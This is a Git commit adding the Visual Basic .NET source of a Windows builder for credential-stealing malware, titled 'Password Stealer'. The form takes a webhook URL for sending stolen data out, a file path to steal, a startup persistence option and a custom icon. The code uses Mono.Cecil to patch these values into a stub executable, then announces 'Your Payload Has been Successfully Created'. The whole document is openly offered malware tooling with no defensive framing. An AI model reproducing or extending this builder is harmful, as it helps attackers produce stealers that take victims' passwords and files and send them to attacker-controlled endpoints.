4fe2b47bc8ebbb853b86bdeba72af4ed144993fb
Levi <76643867+IamLev1@users.noreply.github.com>
2021-10-05 10:34:02 +0800

    Add files via upload

---
+++ Form1.Designer.vb
@@ -0,0 +1,221 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
+        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
+        Me.URL = New System.Windows.Forms.TextBox()
+        Me.L = New System.Windows.Forms.TextBox()
+        Me.START = New System.Windows.Forms.TextBox()
+        Me.CheckBox3 = New System.Windows.Forms.CheckBox()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
+        Me.Label4 = New System.Windows.Forms.Label()
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'PictureBox1
+        '
+        Me.PictureBox1.Location = New System.Drawing.Point(67, 149)
+        Me.PictureBox1.Name = "PictureBox1"
+        Me.PictureBox1.Size = New System.Drawing.Size(173, 58)
+        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
+        Me.PictureBox1.TabIndex = 0
+        Me.PictureBox1.TabStop = False
+        '
+        'Button1
+        '
+        Me.Button1.BackColor = System.Drawing.Color.Lime
+        Me.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Popup
+        Me.Button1.ForeColor = System.Drawing.Color.White
+        Me.Button1.Location = New System.Drawing.Point(246, 149)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(207, 58)
+        Me.Button1.TabIndex = 1
+        Me.Button1.Text = "Build"
+        Me.Button1.UseVisualStyleBackColor = False
+        '
+        'CheckBox1
+        '
+        Me.CheckBox1.AutoSize = True
+        Me.CheckBox1.ForeColor = System.Drawing.Color.Lime
+        Me.CheckBox1.Location = New System.Drawing.Point(3, 51)
+        Me.CheckBox1.Name = "CheckBox1"
+        Me.CheckBox1.Size = New System.Drawing.Size(90, 17)
+        Me.CheckBox1.TabIndex = 2
+        Me.CheckBox1.Text = "File Stealer"
+        Me.CheckBox1.UseVisualStyleBackColor = True
+        '
+        'CheckBox2
+        '
+        Me.CheckBox2.AutoSize = True
+        Me.CheckBox2.ForeColor = System.Drawing.Color.Lime
+        Me.CheckBox2.Location = New System.Drawing.Point(5, 100)
+        Me.CheckBox2.Name = "CheckBox2"
+        Me.CheckBox2.Size = New System.Drawing.Size(67, 17)
+        Me.CheckBox2.TabIndex = 3
+        Me.CheckBox2.Text = "Startup"
+        Me.CheckBox2.UseVisualStyleBackColor = True
+        '
+        'URL
+        '
+        Me.URL.BackColor = System.Drawing.SystemColors.WindowText
+        Me.URL.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.URL.ForeColor = System.Drawing.Color.Yellow
+        Me.URL.Location = New System.Drawing.Point(3, 25)
+        Me.URL.Name = "URL"
+        Me.URL.Size = New System.Drawing.Size(450, 20)
+        Me.URL.TabIndex = 4
+        '
+        'L
+        '
+        Me.L.BackColor = System.Drawing.Color.Black
+        Me.L.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.L.Enabled = False
+        Me.L.ForeColor = System.Drawing.Color.Yellow
+        Me.L.Location = New System.Drawing.Point(3, 74)
+        Me.L.Name = "L"
+        Me.L.Size = New System.Drawing.Size(450, 20)
+        Me.L.TabIndex = 5
+        Me.L.Text = "C:\"
+        '
+        'START
+        '
+        Me.START.BackColor = System.Drawing.Color.Black
+        Me.START.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.START.Enabled = False
+        Me.START.ForeColor = System.Drawing.Color.Yellow
+        Me.START.Location = New System.Drawing.Point(5, 123)
+        Me.START.Name = "START"
+        Me.START.Size = New System.Drawing.Size(235, 20)
+        Me.START.TabIndex = 6
+        Me.START.Text = "Browser"
+        '
+        'CheckBox3
+        '
+        Me.CheckBox3.AutoSize = True
+        Me.CheckBox3.ForeColor = System.Drawing.Color.Lime
+        Me.CheckBox3.Location = New System.Drawing.Point(5, 149)
+        Me.CheckBox3.Name = "CheckBox3"
+        Me.CheckBox3.Size = New System.Drawing.Size(56, 17)
+        Me.CheckBox3.TabIndex = 7
+        Me.CheckBox3.Text = "ICON"
+        Me.CheckBox3.UseVisualStyleBackColor = True
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.ForeColor = System.Drawing.Color.Lime
+        Me.Label1.Location = New System.Drawing.Point(0, 9)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(96, 13)
+        Me.Label1.TabIndex = 8
+        Me.Label1.Text = "Webhooks URL"
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.ForeColor = System.Drawing.Color.Black
+        Me.Label2.Location = New System.Drawing.Point(201, 52)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(232, 13)
+        Me.Label2.TabIndex = 10
+        Me.Label2.Text = "Enter The File Patch Want You to Steal"
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.ForeColor = System.Drawing.Color.Lime
+        Me.Label3.Location = New System.Drawing.Point(156, 104)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(84, 13)
+        Me.Label3.TabIndex = 11
+        Me.Label3.Text = "Startup Name"
+        '
+        'ProgressBar1
+        '
+        Me.ProgressBar1.Location = New System.Drawing.Point(5, 213)
+        Me.ProgressBar1.Name = "ProgressBar1"
+        Me.ProgressBar1.Size = New System.Drawing.Size(449, 10)
+        Me.ProgressBar1.TabIndex = 12
+        '
+        'Label4
+        '
+        Me.Label4.AutoSize = True
+        Me.Label4.ForeColor = System.Drawing.Color.Lime
+        Me.Label4.Location = New System.Drawing.Point(246, 123)
+        Me.Label4.Name = "Label4"
+        Me.Label4.Size = New System.Drawing.Size(204, 13)
+        Me.Label4.TabIndex = 13
+        Me.Label4.Text = "This Tool Was Developed By: Levi"
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.Color.Black
+        Me.ClientSize = New System.Drawing.Size(458, 226)
+        Me.Controls.Add(Me.Label4)
+        Me.Controls.Add(Me.ProgressBar1)
+        Me.Controls.Add(Me.Label3)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.CheckBox3)
+        Me.Controls.Add(Me.START)
+        Me.Controls.Add(Me.L)
+        Me.Controls.Add(Me.URL)
+        Me.Controls.Add(Me.CheckBox2)
+        Me.Controls.Add(Me.CheckBox1)
+        Me.Controls.Add(Me.Button1)
+        Me.Controls.Add(Me.PictureBox1)
+        Me.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.ForeColor = System.Drawing.Color.Lime
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.MaximizeBox = False
+        Me.MinimizeBox = False
+        Me.Name = "Form1"
+        Me.Text = "Password Stealer "
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
+    Friend WithEvents Button1 As System.Windows.Forms.Button
+    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
+    Friend WithEvents CheckBox2 As System.Windows.Forms.CheckBox
+    Friend WithEvents URL As System.Windows.Forms.TextBox
+    Friend WithEvents L As System.Windows.Forms.TextBox
+    Friend WithEvents START As System.Windows.Forms.TextBox
+    Friend WithEvents CheckBox3 As System.Windows.Forms.CheckBox
+    Friend WithEvents Label1 As System.Windows.Forms.Label
+    Friend WithEvents Label2 As System.Windows.Forms.Label
+    Friend WithEvents Label3 As System.Windows.Forms.Label
+    Friend WithEvents ProgressBar1 As System.Windows.Forms.ProgressBar
+    Friend WithEvents Label4 As Label
+End Class
---
+++ Form1.vb
@@ -0,0 +1,131 @@
+﻿Imports System.IO
+Imports Mono.Cecil
+Imports Mono.Cecil.Cil
+
+Public Class Form1
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+
+    End Sub
+
+    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+        Try
+            ProgressBar1.Value = 90
+            Dim dialog As New SaveFileDialog
+            dialog.Filter = "Executable Files (.exe)|*.exe"
+            dialog.FileName = "Levi"
+            dialog.ShowDialog()
+            Dim dit As String = dialog.FileName
+            ProgressBar1.Value = 55
+            If IO.File.Exists(Application.StartupPath & "\Levi\Levi.exe") Then
+            Else
+                MsgBox("No Stub File detected in : " & Application.StartupPath)
+                ProgressBar1.Value = 0
+                Exit Sub
+            End If
+            ProgressBar1.Value = 99
+            Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Levi\Levi.exe"))
+            Dim definition2 As TypeDefinition
+            For Each definition2 In definition.MainModule.GetTypes
+                Dim definition3 As MethodDefinition
+                For Each definition3 In definition2.Methods
+                    If (definition3.Name = ".ctor") Then
+                        Dim enumerator As IEnumerator(Of Instruction) = Nothing
+                        Try
+                            enumerator = definition3.Body.Instructions.GetEnumerator
+                            Do While enumerator.MoveNext
+                                Dim current As Instruction = enumerator.Current
+                                If (current.OpCode.Code = Code.Ldstr) Then
+                                    Dim str As String = current.Operand.ToString
+                                    ProgressBar1.Value = 0
+                                    If (str = "URL") Then
+                                        Dim vN As TextBox = Me.URL
+                                        Dim text As String = vN.Text
+                                        vN.Text = text
+                                        current.Operand = ([text])
+                                        ProgressBar1.Value = 99
+                                    Else
+                                        ProgressBar1.Value = 0
+                                        If (str = "L") Then
+
+                                            If L.Enabled = False Then
+                                                current.Operand = "L"
+                                            Else
+
+                                                current.Operand = L.Text
+                                            End If
+                                            ProgressBar1.Value = 99
+                                            Continue Do
+                                        End If
+                                        ProgressBar1.Value = 0
+                                        If (str = "Browser") Then
+                                            If START.Enabled = False Then
+                                                current.Operand = "NOT!"
+                                            Else
+                                                current.Operand = START.Text
+                                            End If
+                                            ProgressBar1.Value = 99
+                                            Continue Do
+                                        End If
+                                        ProgressBar1.Value = 0
+                                    End If
+                                End If
+                            Loop
+                        Finally
+                            enumerator.Dispose()
+                        End Try
+                    End If
+                Next
+            Next
+            definition.Write(dialog.FileName)
+            If CheckBox1.Checked Then
+                IconN.InjectIcon(dialog.FileName, Me.string_0)
+            End If
+            Dim ptr As IntPtr = GClass2.BeginUpdateResource(dialog.FileName, False)
+            Dim buffer As Byte() = File.ReadAllBytes((Application.StartupPath & "\Stub.manifest"))
+            GClass2.UpdateResource(ptr, CType(24, IntPtr), CType(1, IntPtr), 0, buffer, buffer.Length)
+            GClass2.EndUpdateResource(ptr, False)
+            ProgressBar1.Value = 100
+            MsgBox("Your Payload Has been Successfully Created", MsgBoxStyle.Information, "No System Is Safe")
+            ProgressBar1.Value = 0
+        Catch ex1 As Exception
+            MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
+            Return
+        End Try
+    End Sub
+    Public string_0 As String
+    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
+        If Me.CheckBox3.Checked Then
+            If (Me.PictureBox1.Image Is Nothing) Then
+                Dim dialog As New OpenFileDialog With {
+                    .Filter = "Icon|*.ico",
+                    .Title = "Choose Icon",
+                    .FileName = String.Empty
+                }
+                If (dialog.ShowDialog = DialogResult.OK) Then
+                    Me.string_0 = dialog.FileName
+                    Me.PictureBox1.Image = Image.FromFile(Me.string_0)
+                End If
+            End If
+        Else
+            Me.PictureBox1.Image = Nothing
+        End If
+    End Sub
+
+    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
+        If L.Enabled = False Then
+            L.Enabled = True
+            Label2.ForeColor = Color.Red
+        Else
+            L.Enabled = False
+            Label2.ForeColor = Color.Black
+        End If
+    End Sub
+    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
+        If START.Enabled = False Then
+            START.Enabled = True
+        Else
+            START.Enabled = False
+        End If
+    End Sub
+End Class
